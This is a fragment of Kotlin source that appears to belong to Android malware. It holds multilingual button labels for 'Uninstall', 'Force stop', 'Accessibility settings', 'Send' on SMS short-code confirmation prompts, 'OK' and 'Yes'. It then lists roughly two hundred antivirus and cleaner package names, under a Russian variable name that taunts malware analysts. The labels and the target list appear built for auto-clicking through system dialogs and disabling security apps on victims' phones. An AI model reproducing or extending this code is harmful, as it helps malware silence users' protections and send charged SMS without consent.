                "'bs':'Deinstaliraj'," +
                "'ca':'Desinstal·la'," +
                "'cs':'Odinstalovat'," +
                "'cz':'Odinstalovat'," +
                "'da':'Afinstaller'," +
                "'de':'Entfernen'," +
                "'el':'Απεγκατασταση'," +
                "'en':'Uninstall'," +
                "'es':'Desinstalar'," +
                "'et':'Desinstalli'," +
                "'fa':'حذف نصب'," +
                "'fi':'Poista'," +
                "'fr':'Désinstaller'," +
                "'gl':'Desinstalar'," +
                "'gu':'અનઇન્સ્ટૉલ કરો'," +
                "'hi':'अनइंस्‍टॉल करें'," +
                "'hr':'Deinstaliraj'," +
                "'hu':'Eltávolítás'," +
                "'hy':'Հեռացնել'," +
                "'in':'Uninstal'," +
                "'is':'Fjarlægja'," +
                "'it':'Disinstalla'," +
                "'iw':'הסרת התקנה'," +
                "'ja':'アンインストール'," +
                "'ka':'დეინსტალაცია'," +
                "'kk':'Жою'," +
                "'kn':'ಅನ್‌ಇನ್‌ಸ್ಟಾಲ್ ಮಾಡಿ'," +
                "'ko':'제거'," +
                "'ky':'Чыгарып салуу'," +
                "'lo':'ຖອນການຕິດຕັ້ງ'," +
                "'lt':'Pašalinti'," +
                "'lv':'Pasalinti'," +
                "'mk':'Деинсталирај'," +
                "'ml':'അൺഇൻസ്‌റ്റാള്‍ ചെയ്യുക'," +
                "'mn':'Устгах'," +
                "'mr':'अनइंस्टॉल करा'," +
                "'ms':'Nyahpasang'," +
                "'my':'ဖြုတ်ရန်'," +
                "'nb':'Avinstaller'," +
                "'ne':'स्थापना रद्द गर्नु…'," +
                "'nl':'Verwijderen'," +
                "'no':'Avinstaller'," +
                "'or':'ଅନଇନଷ୍ଟଲ୍‌ କରନ୍ତୁ'," +
                "'pl':'Odinstaluj'," +
                "'pt':'Desinstalar'," +
                "'ro':'Dezinstalați'," +
                "'ru':'Удалить'," +
                "'si':'අස්ථාපනය කරන්න'," +
                "'sk':'Odinštalovať'," +
                "'sl':'Odmesti'," +
                "'sq':'Çinstalo'," +
                "'sr':'Деинсталирај'," +
                "'sv':'Avinstallera'," +
                "'sw':'Ondoa'," +
                "'ta':'நிறுவல் நீக்கு'," +
                "'te':'అన్ఇన్‌స్టాల్ చేయండి'," +
                "'th':'ถอนการติดตั้ง'," +
                "'tl':'Uninstall'," +
                "'tr':'Kaldır'," +
                "'ur':'اَن انسٹال کریں'," +
                "'uz':'O‘Chirib tashlash'," +
                "'vi':'Gỡ cài đặt'," +
                "'zu':'Khipha'" +
                "}"

    val harmful_app_warning_uninstall2: String =
        "{" +
                "'da':'Af-'," +
                "'de':'Deinstal-'," +
                "'en':'Uninstall'," +
                "'es':'Desinstalar'," +
                "'fr':'Désinst'," +
                "'it':'Disinst'," +
                "'no':'Avinstaller'," +
                "'ru':'Удалить'," +
                "'sv':'Avinstal-'," +
                "'tr':'Kaldır'" +
                "}"

    val lockscreen_transport_pause_description: String =
        "{" +
                "'am':'ለአፍታ አቁም'," +
                "'ar':'إيقاف مؤقت'," +
                "'as':'পজ কৰক'," +
                "'az':'Pauza'," +
                "'be':'Прыпыніць'," +
                "'bg':'Пауза'," +
                "'bn':'বিরাম দিন'," +
                "'bs':'Pauziraj'," +
                "'ca':'Posa en pausa'," +
                "'cs':'Pozastavit'," +
                "'cz':'Vynutit ukonceni'," +
                "'da':'Pause'," +
                "'de':'Beenden erzwingen'," +
                "'el':'Παύση'," +
                "'en':'Pause'," +
                "'es':'Forzar detencion'," +
                "'et':'Peata'," +
                "'fa':'مکث'," +
                "'fi':'Tauko'," +
                "'fr':'Forcer '," +
                "'gl':'Pausar'," +
                "'gu':'થોભો'," +
                "'hi':'रोकें'," +
                "'hr':'Pauziraj'," +
                "'hu':'Szünet'," +
                "'hy':'Դադարեցնել'," +
                "'in':'Jeda'," +
                "'is':'Hlé'," +
                "'it':'Interruzione'," +
                "'iw':'השהה'," +
                "'ja':'一時停止'," +
                "'ka':'პაუზა'," +
                "'kk':'Кідірту'," +
                "'kn':'ವಿರಾಮಗೊಳಿಸು'," +
                "'ko':'일시중지'," +
                "'ky':'Тындыруу'," +
                "'lo':'ຢຸດຊົ່ວຄາວ'," +
                "'lt':'Pristabdyti'," +
                "'lv':'Sustabdyti'," +
                "'mk':'Пауза'," +
                "'ml':'താൽക്കാലികമായി നിർത്തുക'," +
                "'mn':'Түр зогсоох'," +
                "'mr':'विराम द्या'," +
                "'ms':'Jeda'," +
                "'my':'ခဏရပ်ရန်'," +
                "'nb':'Sett på pause'," +
                "'ne':'रोक्नुहोस्'," +
                "'nl':'Onderbreken'," +
                "'no':'Pause'," +
                "'or':'ପଜ୍‍ କରନ୍ତୁ'," +
                "'pl':'Wymus zatrzymanie'," +
                "'pt':'Pausar'," +
                "'ro':'Pauză'," +
                "'ru':'Приостановить'," +
                "'si':'විරාමය'," +
                "'sk':'Pozastaviť'," +
                "'sl':'Zaustavi'," +
                "'sq':'Pauzë'," +
                "'sr':'Пауза'," +
                "'sv':'Pausa'," +
                "'sw':'Sitisha'," +
                "'ta':'இடைநிறுத்து'," +
                "'te':'పాజ్ చేయి'," +
                "'th':'หยุดชั่วคราว'," +
                "'tl':'I-pause'," +
                "'tr':'Durmaya zorla'," +
                "'ur':'موقوف کریں'," +
                "'uz':'To‘xtatib turish'," +
                "'vi':'Tạm dừng'," +
                "'zu':'Misa isikhashana'" +
                "}"

    val menu_setting: String =
        "{" +
                "'bg':'Настройки'," +
                "'cz':'Nastaveni'," +
                "'da':'Indstilling'," +
                "'de':'Einstellungen'," +
                "'el':'Ρυθμίσεις'," +
                "'en':'Setting'," +
                "'es':'Ajustes'," +
                "'fr':'Parametres'," +
                "'hr':'Postavke'," +
                "'it':'Impostazioni'," +
                "'ja':'設定'," +
                "'ka':'პარამეტრები'," +
                "'ko':'Setting'," +
                "'lv':'Nustatymai'," +
                "'nl':'Instelling'," +
                "'no':'Setting'," +
                "'pl':'Ustawienia'," +
                "'pt':'Definições'," +
                "'ro':'Setare'," +
                "'ru':'Настройки'," +
                "'sk':'Nastavenie'," +
                "'sr':'Подешавање'," +
                "'sv':'Inställningar'," +
                "'th':'ตั้งค่า'," +
                "'tr':'Ayarlar'," +
                "'uk':'Налаштування'" +
                "}"

    val notification_app_name_settings: String =
        "{" +
                "'am':'ቅንብሮች'," +
                "'ar':'الإعدادات'," +
                "'as':'ছেটিংসমূহ'," +
                "'az':'Ayarlar'," +
                "'be':'Налады'," +
                "'bg':'Настройки'," +
                "'bn':'সেটিংস'," +
                "'bs':'Postavke'," +
                "'ca':'Configuració'," +
                "'cs':'Nastavení'," +
                "'cz':'Nastaveni'," +
                "'de':'Einstellungen'," +
                "'el':'Ρυθμίσεις'," +
                "'en':'Settings'," +
                "'es':'Ajustes'," +
                "'et':'Seaded'," +
                "'fa':'تنظیمات'," +
                "'fi':'Asetukset'," +
                "'fr':'Parametres'," +
                "'gl':'Configuración'," +
                "'gu':'સેટિંગ'," +
                "'hi':'सेटिंग'," +
                "'hr':'Postavke'," +
                "'hu':'Beállítások'," +
                "'hy':'Կարգավորումներ'," +
                "'in':'Setelan'," +
                "'is':'Stillingar'," +
                "'it':'Impostazioni'," +
                "'iw':'הגדרות'," +
                "'ja':'設定'," +
                "'ka':'პარამეტრები'," +
                "'kk':'Параметрлер'," +
                "'kn':'ಸೆಟ್ಟಿಂಗ್‌ಗಳು'," +
                "'ko':'설정'," +
                "'ky':'Жөндөөлөр'," +
                "'lo':'ການຕັ້ງຄ່າ'," +
                "'lt':'Nustatymai'," +
                "'lv':'Nustatymai'," +
                "'mk':'Поставки'," +
                "'ml':'ക്രമീകരണം'," +
                "'mn':'Тохиргоо'," +
                "'mr':'सेटिंग्ज'," +
                "'ms':'Tetapan'," +
                "'my':'ဆက်တင်များ'," +
                "'nb':'Innstillinger'," +
                "'ne':'सेटिङहरू'," +
                "'nl':'Instellingen'," +
                "'no':'Settings'," +
                "'or':'ସେଟିଙ୍ଗ'," +
                "'pl':'Ustawienia'," +
                "'pt':'Configurações'," +
                "'ro':'Setări'," +
                "'ru':'Настройки'," +
                "'si':'සැකසීම්'," +
                "'sk':'Nastavenia'," +
                "'sl':'Nastavitve'," +
                "'sq':'Cilësimet'," +
                "'sr':'Подешавања'," +
                "'sv':'Inställningar'," +
                "'sw':'Mipangilio'," +
                "'ta':'அமைப்புகள்'," +
                "'te':'సెట్టింగ్‌లు'," +
                "'th':'การตั้งค่า'," +
                "'tl':'Mga Setting'," +
                "'tr':'Ayarlar'," +
                "'ur':'ترتیبات'," +
                "'uz':'Sozlamalar'," +
                "'vi':'Cài đặt'," +
                "'zu':'Izilungiselelo'" +
                "}"

    val ok: String =
        "{" +
                "'am':'እሺ'," +
                "'ar':'حسنًا'," +
                "'as':'ঠিক আছে'," +
                "'az':'OK'," +
                "'be':'ОК'," +
                "'bg':'OK'," +
                "'bn':'ঠিক আছে'," +
                "'bs':'Uredu'," +
                "'ca':'acord'," +
                "'cs':'OK'," +
                "'cz':'ОК'," +
                "'da':'OK'," +
                "'de':'ОК'," +
                "'el':'OK'," +
                "'en':'OK'," +
                "'es':'ОК'," +
                "'et':'OK'," +
                "'fa':'تأیید'," +
                "'fi':'OK'," +
                "'fr':'ОК'," +
                "'gl':'Aceptar'," +
                "'gu':'ઓકે'," +
                "'hi':'ठीक है'," +
                "'hr':'U redu'," +
                "'hu':'OK'," +
                "'hy':'Լավ'," +
                "'in':'Oke'," +
                "'is':'Í lagi'," +
                "'it':'ОК'," +
                "'iw':'אישור'," +
                "'ja':'OK'," +
                "'ka':'OK'," +
                "'kk':'Жарайды'," +
                "'kn':'ಸರಿ'," +
                "'ko':'확인'," +
                "'ky':'Жарайт'," +
                "'lo':'ຕົກລົງ'," +
                "'lt':'Gerai'," +
                "'lv':'ОК'," +
                "'mk':'Во ред'," +
                "'ml':'ശരി'," +
                "'mn':'ОК'," +
                "'mr':'ठीक आहे'," +
                "'ms':'OK'," +
                "'my':'OK'," +
                "'nb':'OK'," +
                "'ne':'ठिक छ'," +
                "'nl':'OK'," +
                "'no':'OK'," +
                "'or':'ଠିକ୍‍ ଅଛି'," +
                "'pl':'ОК'," +
                "'pt':'Aceitar'," +
                "'ro':'OK'," +
                "'ru':'ОК'," +
                "'si':'හරි'," +
                "'sk':'OK'," +
                "'sl':'V redu'," +
                "'sq':'Në rregull'," +
                "'sr':'Потврди'," +
                "'sv':'OK'," +
                "'sw':'Sawa'," +
                "'ta':'சரி'," +
                "'te':'సరే'," +
                "'th':'ตกลง'," +
                "'tl':'OK'," +
                "'tr':'Tamam'," +
                "'uk':'Гаразд'," +
                "'ur':'ٹھیک ہے'," +
                "'uz':'OK'," +
                "'vi':'OK'," +
                "'zu':'Ok'" +
                "}"

    val reset: String =
        "{" +
                "'am':'ዳግም አስጀምር'," +
                "'ar':'إعادة الضبط'," +
                "'as':'ৰিছেট কৰক'," +
                "'az':'Sıfırlayın'," +
                "'be':'Скінуць'," +
                "'bg':'Повторно задаване'," +
                "'bn':'রিসেট করুন'," +
                "'bs':'Vrati na zadano'," +
                "'ca':'Restableix'," +
                "'cs':'Resetovat'," +
                "'cz':'Vymazat'," +
                "'da':'Nulstil'," +
                "'de':'Zurücksetzen'," +
                "'el':'Επαναφορά'," +
                "'en':'Reset'," +
                "'es':'Borrar'," +
                "'et':'Lähtesta'," +
                "'fa':'بازنشانی'," +
                "'fi':'Palauta'," +
                "'fr':'Reinitialiser'," +
                "'gl':'Restablecer'," +
                "'gu':'ફરીથી સેટ કરો'," +
                "'hi':'रीसेट करें'," +
                "'hr':'Ponovo postavi'," +
                "'hu':'Alaphelyzet'," +
                "'hy':'Վերակայել'," +
                "'in':'Setel ulang'," +
                "'is':'Endurstilla'," +
                "'it':'Reimposta'," +
                "'iw':'איפוס'," +
                "'ja':'リセット'," +
                "'ka':'საწყისზე დაბრუნება'," +
                "'kk':'Бастапқы күйге қайтару'," +
                "'kn':'ಮರುಹೊಂದಿಸು'," +
                "'ko':'초기화'," +
                "'ky':'Баштапкы абалга келтирүү'," +
                "'lo':'ຣີເຊັດ'," +
                "'lt':'Atstatyti'," +
                "'lv':'Atiestatit'," +
                "'mk':'Ресетирај'," +
                "'ml':'പുനഃസജ്ജമാക്കുക'," +
                "'mn':'Бүгдийг цэвэрлэх'," +
                "'mr':'रीसेट करा'," +
                "'ms':'Tetapkan semula'," +
                "'my':'ပြန်လည်သတ်မှတ်ရန်'," +
                "'nb':'Tilbakestill'," +
                "'ne':'रिसेट गर्नुहोस्'," +
                "'nl':'Resetten'," +
                "'no':'Reset'," +
                "'or':'ରିସେଟ୍‍ କରନ୍ତୁ'," +
                "'pl':'Resetuj ustawienia aplikacji'," +
                "'pt':'Redefinir'," +
                "'ro':'Resetați'," +
                "'ru':'Сбросить'," +
                "'si':'යළි පිහිටුවන්න'," +
                "'sk':'Resetovať'," +
                "'sl':'Ponastavi'," +
                "'sq':'Rivendos'," +
                "'sr':'Ресетуј'," +
                "'sv':'Återställ'," +
                "'sw':'Weka upya'," +
                "'ta':'மீட்டமை'," +
                "'te':'రీసెట్ చేయి'," +
                "'th':'รีเซ็ต'," +
                "'tl':'I-reset'," +
                "'tr':'Sifirlama'," +
                "'ur':'ری سیٹ کریں'," +
                "'uz':'Asliga qaytarish'," +
                "'vi':'Đặt lại'," +
                "'zu':'Setha kabusha'" +
                "}"

    val sms_short_code_confirm_allow: String =
        "{" +
                "'am':'ላክ'," +
                "'ar':'إرسال'," +
                "'as':'পঠিয়াওক'," +
                "'az':'Göndər'," +
                "'be':'Адправiць'," +
                "'bg':'Изпращане'," +
                "'bn':'পাঠান'," +
                "'bs':'Pošalji'," +
                "'ca':'Envia'," +
                "'cs':'Odeslat'," +
                "'cz':'poslat'," +
                "'da':'Send'," +
                "'de':'Senden'," +
                "'el':'Αποστολή'," +
                "'en':'Send'," +
                "'es':'Enviar'," +
                "'et':'Saada'," +
                "'fa':'ارسال'," +
                "'fi':'Lähetä'," +
                "'fr':'Envoyer'," +
                "'gl':'Enviar'," +
                "'gu':'મોકલો'," +
                "'hi':'भेजें'," +
                "'hr':'Pošalji'," +
                "'hu':'Küldés'," +
                "'hy':'Ուղարկել'," +
                "'in':'Kirim'," +
                "'is':'Senda'," +
                "'it':'Spedire'," +
                "'iw':'שלח'," +
                "'ja':'送信'," +
                "'ka':'გაგზავნა'," +
                "'kk':'Жіберу'," +
                "'kn':'ಕಳುಹಿಸು'," +
                "'ko':'전송'," +
                "'ky':'Жөнөтүү'," +
                "'lo':'ສົ່ງ'," +
                "'lt':'Siųsti'," +
                "'lv':'Siusti'," +
                "'mk':'Испрати'," +
                "'ml':'അയയ്‌ക്കുക'," +
                "'mn':'Илгээх'," +
                "'mr':'पाठवा'," +
                "'ms':'Hantar'," +
                "'my':'ပို့ရန်'," +
                "'nb':'Send'," +
                "'ne':'पठाउनुहोस्'," +
                "'nl':'Verzenden'," +
                "'no':'Send'," +
                "'or':'ପଠାନ୍ତୁ'," +
                "'pl':'Wyslac'," +
                "'pt':'Enviar'," +
                "'ro':'Trimiteți'," +
                "'ru':'Отправить'," +
                "'si':'යවන්න'," +
                "'sk':'Odoslať'," +
                "'sl':'Pošlji'," +
                "'sq':'Dërgo'," +
                "'sr':'Пошаљи'," +
                "'sv':'Skickat'," +
                "'sw':'Tuma'," +
                "'ta':'அனுப்பு'," +
                "'te':'పంపు'," +
                "'th':'ส่ง'," +
                "'tl':'Ipadala'," +
                "'tr':'Mesaj gönder'," +
                "'ur':'بھیجیں'," +
                "'uz':'Yuborish'," +
                "'vi':'Gửi'," +
                "'zu':'Thumela'" +
                "}"

    val spec_settings: String =
        "{" +
                "'en':'Accessibility settings'," +
                "'da':'Tilgængelighedsin dstillinger'," +
                "'de':'Zugänglichkeitsein stellungen'," +
                "'es':'Ajustes de accesibilidad'," +
                "'fr':'accessibilité'," +
                "'it':'Impostazioni accessibilità'," +
                "'no':'Tilgjengelighetsinn stillinger'," +
                "'ru':'Специальные возможности'," +
                "'sv':'Tillgänglighetsinst ällningar'," +
                "'tr':'Erişilebililirlik ayarlari'" +
                "}"

    val spec_settings2: String =
        "{" +
                "'en':'Accessibility'," +
                "'da':'Tilgængelighed'," +
                "'es':'Accesibilidad'," +
                "'fr':'Accessibilité'," +
                "'it':'Accessibilità'," +
                "'no':'Tilgjengelighet'," +
                "'sv':'Tillgänglighet'," +
                "'tr':'Erişilebililirlik'" +
                "}"

    val storage_title: String =
        "{" +
                "'am':'ማከማቻ'," +
                "'ar':'تخزين'," +
                "'az':'Saxlama'," +
                "'be':'Захоўванне'," +
                "'bg':'Пространство:'," +
                "'bn':'স্টোরেজ'," +
                "'bs':'Skladištenje'," +
                "'ca':'Emmagatzematge'," +
                "'cs':'Úložný prostor'," +
                "'da':'Opbevaring:'," +
                "'el':'αποθήκευση'," +
                "'en':'Storage:'," +
                "'et':'Ladustamine'," +
                "'fi':'Varastointi'," +
                "'fr':'Stockage:'," +
                "'gl':'Almacenamento'," +
                "'hr':'Pohrana:'," +
                "'hy':'Պահեստավորում'," +
                "'it':'Memoria archiviazione'," +
                "'ja':'ストレージ:'," +
                "'ka':'შენახვა'," +
                "'ko':'Storage:'," +
                "'nl':'Opslag:'," +
                "'no':'Lagring'," +
                "'pt':'Espaço:'," +
                "'ru':'Памят'," +
                "'sk':'Pamäť:'," +
                "'sq':'Magazinimi'," +
                "'sr':'Складиште'," +
                "'sv':'Lagring:'," +
                "'th':'ที่จัดเก็บ:'," +
                "'tr':'Depolama:'," +
                "'uk':'Носій:'" +
                "}"

    val uninstall_selected_apps: String =
        "{" +
                "'bg':'Почисти всичко'," +
                "'cz':'Vymazat mezipamet'," +
                "'da':'Slet alt'," +
                "'de':'Cache leeren'," +
                "'el':'τα καθαρίζω όλα'," +
                "'en':'Clear All'," +
                "'es':'Borrar cache'," +
                "'fr':'Vider le cache'," +
                "'hr':'Očisti Sve'," +
                "'it':'Svuota cache'," +
                "'ja':'全てクリア'," +
                "'ka':'ყველაფრის გასუფთავება'," +
                "'ko':'Clear All'," +
                "'lv':'Isvalyti talpykla'," +
                "'nl':'Alles wissen'," +
                "'no':'Clear All'," +
                "'pl':'Wyczyc pamiec podreczna'," +
                "'pt':'Limpar Tudo'," +
                "'ro':'Curătă Toate'," +
                "'ru':'Очистить кэш'," +
                "'sk':'Vymazať všetko'," +
                "'sr':'избриши све'," +
                "'sv':'Rensa alla'," +
                "'th':'ล้างทั้งหมด'," +
                "'tr':'Önbellegi temiyle'," +
                "'uk':'Очистити всі'" +
                "}"

    val wait: String =
        "{" +
                "'am':'ቆይ'," +
                "'ar':'انتظار'," +
                "'as':'অপেক্ষা কৰক'," +
                "'az':'Gözlə'," +
                "'be':'Чакаць'," +
                "'bg':'Изчакване'," +
                "'bn':'অপেক্ষা করুন'," +
                "'bs':'Sačekaj'," +
                "'ca':'Espera'," +
                "'cs':'Počkat'," +
                "'da':'Vent'," +
                "'de':'Warten'," +
                "'el':'Αναμονή'," +
                "'en':'Wait'," +
                "'es':'Esperar'," +
                "'et':'Oodake'," +
                "'fa':'منتظر بمانید'," +
                "'fi':'Odota'," +
                "'fr':'Attendre'," +
                "'gl':'Esperar'," +
                "'gu':'રાહ જુઓ'," +
                "'hi':'प्रतीक्षा करें'," +
                "'hr':'Pričekaj'," +
                "'hu':'Várakozás'," +
                "'hy':'Սպասեք'," +
                "'in':'Tunggu'," +
                "'is':'Bíða'," +
                "'it':'Attendi'," +
                "'iw':'המתן'," +
                "'ja':'待機'," +
                "'ka':'მოცდა'," +
                "'kk':'Күту'," +
                "'kn':'ನಿರೀಕ್ಷಿಸು'," +
                "'ko':'대기'," +
                "'ky':'Күтүү'," +
                "'lo':'ລໍ​ຖ້າ'," +
                "'lt':'Palaukti'," +
                "'lv':'Gaidīt'," +
                "'mk':'Почекај'," +
                "'ml':'കാത്തിരിക്കുക'," +
                "'mn':'Хүлээх'," +
                "'mr':'प्रतीक्षा करा'," +
                "'ms':'Tunggu'," +
                "'my':'စောင့်ဆိုင်းရန်'," +
                "'nb':'Vent'," +
                "'ne':'प्रतीक्षा गर्नुहोस्'," +
                "'nl':'Wachten'," +
                "'no':'Wait'," +
                "'or':'ଅପେକ୍ଷା କରନ୍ତୁ'," +
                "'pl':'Czekaj'," +
                "'pt':'Aguardar'," +
                "'ro':'Așteptați'," +
                "'ru':'Подождать'," +
                "'si':'රැඳී සිටින්න'," +
                "'sk':'Čakajte'," +
                "'sl':'Čakaj'," +
                "'sq':'Prit!'," +
                "'sr':'Сачекај'," +
                "'sv':'Vänta'," +
                "'sw':'Subiri'," +
                "'ta':'காத்திரு'," +
                "'te':'వేచి ఉండు'," +
                "'th':'รอ'," +
                "'tl':'Maghintay'," +
                "'tr':'Bekle'," +
                "'ur':'انتظار کریں'," +
                "'uz':'Kutish'," +
                "'vi':'Đợi'," +
                "'zu':'Linda'" +
                "}"

    val yes: String =
        "{" +
                "'am':'እሺ'," +
                "'ar':'حسنًا'," +
                "'as':'ঠিক আছে'," +
                "'az':'OK'," +
                "'be':'ОК'," +
                "'bg':'Да'," +
                "'bn':'ঠিক আছে'," +
                "'bs':'Uredu'," +
                "'ca':'acord'," +
                "'cs':'OK'," +
                "'cz':'Ano'," +
                "'da':'OK'," +
                "'de':'Ja'," +
                "'el':'OK'," +
                "'en':'Yes'," +
                "'es':'Si'," +
                "'et':'OK'," +
                "'fa':'تأیید'," +
                "'fi':'OK'," +
                "'fr':'Oui'," +
                "'gl':'Aceptar'," +
                "'gu':'ઓકે'," +
                "'hi':'ठीक है'," +
                "'hr':'Da'," +
                "'hu':'OK'," +
                "'hy':'Լավ'," +
                "'in':'Oke'," +
                "'is':'Í lagi'," +
                "'it':'Si'," +
                "'iw':'אישור'," +
                "'ja':'はい'," +
                "'ka':'OK'," +
                "'kk':'Жарайды'," +
                "'kn':'ಸರಿ'," +
                "'ko':'확인'," +
                "'ky':'Жарайт'," +
                "'lo':'ຕົກລົງ'," +
                "'lt':'Gerai'," +
                "'lv':'Taip'," +
                "'mk':'Во ред'," +
                "'ml':'ശരി'," +
                "'mn':'ОК'," +
                "'mr':'ठीक'," +
                "'ms':'OK'," +
                "'my':'OK'," +
                "'nb':'OK'," +
                "'ne':'ठिक छ'," +
                "'nl':'Ja'," +
                "'no':'Yes'," +
                "'or':'ଠିକ୍‍ ଅଛି'," +
                "'pl':'Tak'," +
                "'pt':'OK'," +
                "'ro':'Da'," +
                "'ru':'ОК'," +
                "'si':'හරි'," +
                "'sk':'Áno'," +
                "'sl':'V redu'," +
                "'sq':'Në rregull'," +
                "'sr':'Потврди'," +
                "'sv':'Ja'," +
                "'sw':'Sawa'," +
                "'ta':'சரி'," +
                "'te':'సరే'," +
                "'th':'ใช่'," +
                "'tl':'OK'," +
                "'tr':'ОК'," +
                "'uk':'Так'," +
                "'ur':'ٹھیک ہے'," +
                "'uz':'OK'," +
                "'vi':'OK'," +
                "'zu':'Kulungile'" +
                "}"

    var тупые_реверсы_думают_что_эти_приложения_будем_атаковать = arrayOf(
        "com.kms.free",
        "com.drweb",
        "com.eset.endpoint",
        "com.eset.parental",
        "com.eset.stagefrightdetector",
        "com.eset.ems2.gp",
        "com.eset.ems2.megafon",
        "com.eset.ems2.mts",
        "com.eset.ems2.beeline",
        "com.eset.ems2.tele2",
        "com.eset.ems2.yota",
        "com.eset.ems2.vodafone",
        "com.eset.ems2.telekom",
        "com.eset.ems2.stc",
        "com.eset.ems2.turkcell",
        "com.eset.ems2.movistar",
        "com.eset.ems2.yoigo",
        "com.eset.ems2.lycamobile",
        "com.estrongs.android.pop",
        "com.iobit.mobilecare",
        "com.androhelm.antivirus.free",
        "com.androhelm.antivirus.free1",
        "com.androhelm.antivirus.free2",
        "com.androhelm.antivirus.tablet.premium",
        "com.androhelm.antivirus.premium",
        "com.androhelm.antivirus.tablet.pro",
        "com.androhelm.antivirus.pro",
        "com.antivirus",
        "com.coopresapps.free.antivirus",
        "com.conenestpps.fade.andivires",
        "com.antivirus.applock.cleanbooster",
        "net.apptools.antivirusfree.security.cleanmaster",
        "com.antivirus.mobilesecurity.viruscleaner.applock",
        "com.zrgiu.antivirus",
        "com.bitdefender.antivirus",
        "com.taptechnology.antivirus.mobile",
        "com.avira.android",
        "com.antivirussystemforandroid.brainiacs.googleplay",
        "com.guardian.security.pri",
        "com.avast.android.mobilesecurity",
        "com.avg.cleaner",
        "com.antiy.avl",
        "com.bitdefender.security",
        "virus.cleaner.antivirus.phone.security.boost",
        "com.trendmicro.freetmms.gmobi",
        "com.drweb.mcc",
        "com.drweb",
        "com.drweb.pro",
        "com.falcon.antivirus",
        "com.hawk.security",
        "com.arcane.incognito",
        "com.security.antivirus.clean",
        "com.kaspersky.kes",
        "com.kms.free",
        "com.kaspersky.security.cloud",
        "jp.naver.lineantivirus.android",
        "com.lookout",
        "org.malwarebytes.antimalware",
        "com.wsandroid.suite",
        "com.trendmicro.tmmspersonal",
        "com.nqmobile.antivirus20",
        "com.nkapa.antivirus.safephone.security",
        "com.zoner.android.antivirus",
        "com.iobit.amccleaner.booster",
        "com.avast.android.cleaner",
        "com.avira.optimizer",
        "com.cleanmaster.mguard",
        "cleanmaster.phone.memory.booster.cleaner",
        "com.estrongs.android.pop",
        "com.symantec.cleansweep",
        "com.pandasecurity.pandaav",
        "com.sophos.smsec",
        "com.bestanti.phoneboots",
        "com.dotakapp.Booster.cleaner",
        "com.piriform.ccleaner",
        "com.huawei.securitymgr",
        "com.miui.guardprovider",
        "com.qualcomm.qti.qms.service.telemetry",
        "com.qualcomm.qti.poweroffalarm",
        "com.xiaomi.powerchecker",
        "com.ghisler.android.TotalCommander",
        "com.miui.securitycenter",
        "eu.thedarken.sdm",
        "com.google.android.gsf",
        "com.a0soft.gphone.acc.free",
        "booster.optimizer.cleaner",
        "com.battery.smart.manager",
        "com.ace.cleaner",
        "org.adblockplus.adblockplussbrowser",
        "com.adguard.android.contentblocker",
        "com.boxita.booster.supercleaner",
        "imoblife.toolbox.full",
        "com.iobit.amccleaner.lite.booster",
        "com.excel.apps.cleaner.ram10gb",
        "appinventor.ai_mmfrutos7878.Ancleaner",
        "com.advancedprocessmanager",
        "com.google.android.projection.gearhead",
        "com.mytools.cleaner.booster",
        "com.ninexgen.cleaner",
        "com.apusapps.turbocleaner",
        "com.ashampoo.auto.clean.up",
        "com.s.cleaner",
        "com.appybuilder.dennis_littawe1542.BCleaner",
        "com.betteridea.file.cleaner",
        "com.cache.cleaner.booster.ram.storage",
        "com.frozendevs.cache.cleaner",
        "com.jrummy.cache.cleaner",
        "com.lighthouseadstech.chiefcleaner",
        "com.swings.cacheclear",
        "com.litetools.cleaner",
        "com.rambooster.ram.ramcleaner",
        "com.onegogo.explorer",
        "clean.booster.phone",
        "com.phonebooster.cooler.junkcleaner.appclean.speed",
        "com.phone.cleaner.speed.booster.cleaningmaster",
        "com.turbocooler.turbobooster.turbocleaner.cpumaster",
        "com.theappsstorm.clean.boost.max.fast.cool",
        "clean.antivirus.security.viruscleaner",
        "com.clean.boost.cacheclear",
        "com.digibites.accubattery",
        "com.stolitomson",
        "net.hubalek.android.reborn.beta",
        "com.elvison.batterywidget",
        "com.geekyouup.android.widgets.battery",
        "tech.tools.battery",
        "com.a0soft.gphone.aDataOnOff",
        "dev.instruments.optimaizer",
        "com.kdevstudio.w.cleaner",
        "com.lookandfeel.cleanerforwhatsapp",
        "com.ushareit.cleanit",
        "com.glgjing.hulk",
        "com.appeteria.battery100alarm",
        "com.clear.cache.app",
        "com.clearMemoryAdcoms",
        "com.gombosdev.ampere",
        "com.speedoptimize.tool.clean",
        "com.quanqu.master.clean",
        "ccc71.bmw",
        "com.ashampoo.droid.optimizer",
        "com.limsky.speedbooster",
        "com.batterypro.batteryrepairlife2020",
        "com.finalwire.aida64",
        "com.kaerosduplicatescleaner",
        "com.ludashi.superclean",
        "com.ludashi.clean.lite",
        "com.shere.easycleaner",
        "net.lepeng.batterydoctor",
        "com.phone.optimize.battery.saver.fastcharging",
        "com.mobilestudios.cl.batteryturbocharger",
        "com.expert.cleaner.phone.cleaner.speed.booster",
        "com.jrm.batterysaver",
        "jp.snowlife01.android.cache_delete",
        "com.batteryoptimizer.fastcharging.fastcharger",
        "com.eco.fastcharger",
        "com.mastudio.smartboost.coolerapp.fastsupercleaner",
        "com.powerd.cleaner",
        "com.tappx.flipnsave.battery",
        "org.artsplanet.android.sunaobattery",
        "com.antivirus.free.security.cleaner",
        "com.gto.zero.zboost",
        "com.nqmobile.battery",
        "com.iekie.free.clean",
        "com.gsamlabs.bbm",
        "com.clearcache.cachecleaner.junkremoval",
        "com.kaspersky.batterysaver",
        "com.macminiandroid.antivirus.antivirus360",
        "com.virus.cleaner.antivirus.clean",
        "com.androidantivirus",
        "com.cxzh.antivirus",
        "com.comodo.cisme.antivirus",
        "org.antivirus.tablet",
        "com.fsecure.ms.safe",
        "com.scanvirus.antivirus.security",
        "com.jb.security",
        "com.lookout.heartbleeddetector",
        "com.junkremoval.pro",
        "com.google.android.apps.nbu.files",
        "com.projectstar.ishredder.android.standard",
        "com.k7computing.android.security",
        "com.samsung.android.knox.enrollment",
        "com.bryancandi.knoxcheck",
        "com.linpus.battery",
        "com.lookout.net",
        "com.phone.mastercleaner",
        "com.bass.max.cleaner",
        "com.newimax.cleaner",
        "imoblife.memorybooster.lite",
        "com.localapp.waqar.batterysaver",
        "com.appsinnova.android.keepclean.lite",
        "com.appsinnova.android.keepclean",
        "com.nero.tuneitup",
        "com.symantec.mobilesecurity",
        "com.noxgroup.app.security",
        "com.cleanteam.oneboost",
        "com.cleanteam.onesecurity",
        "phone.cleaner.speed.booster.cache.clean.android.master",
        "phone.cleaner.speed.booster",
        "com.super.cleaner.phone.cleaner.speed.batterysaver",
        "com.distimo.phoneguardian",
